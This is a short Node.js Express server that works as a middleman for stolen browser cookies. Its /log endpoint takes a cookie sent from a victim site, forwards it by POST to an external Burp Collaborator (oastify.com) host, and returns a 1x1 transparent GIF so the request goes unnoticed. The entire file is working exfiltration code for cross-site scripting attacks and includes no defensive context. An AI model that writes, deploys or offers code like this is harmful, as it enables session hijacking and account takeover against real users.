const express = require('express');
const axios = require('axios'); // A popular library for making HTTP requests
const app = express();
const PORT = 3000;

// This endpoint catches the data from Site A
app.get('/log', async (req, res) => {
    const stolenCookie = req.query.data;
    
    console.log(`Received cookie from Site A: ${stolenCookie}`);

    try {
        // Forwarding the data to Site C via POST
        const response = await axios.post('https://0hi6cy3kynspq39yalf9mxocq3wukk89.oastify.com', {
            source: 'Site B Middleman',
            cookieData: stolenCookie,
            timestamp: new Date().toISOString()
        });

        console.log('Successfully forwarded to Site C');
        
        // Respond with a 1x1 transparent pixel to satisfy the browser
        const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
        res.writeHead(200, {
            'Content-Type': 'image/gif',
            'Content-Length': pixel.length
        });
        res.end(pixel);

    } catch (error) {
        console.error('Error forwarding to Site C:', error.message);
        res.status(500).send('Forwarding failed');
    }
});

app.listen(PORT, () => {
    console.log(`Site B listening at http://localhost:${PORT}`);
});
